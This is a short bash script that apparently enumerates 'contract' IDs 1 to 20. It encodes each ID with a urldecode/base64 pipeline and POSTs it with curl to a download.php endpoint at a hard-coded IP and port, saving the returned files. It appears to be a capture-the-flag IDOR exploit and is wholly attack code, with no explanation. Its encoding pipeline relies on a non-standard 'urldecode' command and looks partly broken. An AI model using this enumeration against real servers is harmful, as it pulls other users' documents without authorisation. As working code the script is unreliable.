#!/bin/bash

for i in {1..20}; do
    for hash in $(echo -n $i | urldecode | base64 -w 0 | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://83.136.255.106:37816/download.php?contract=$hash
    done
done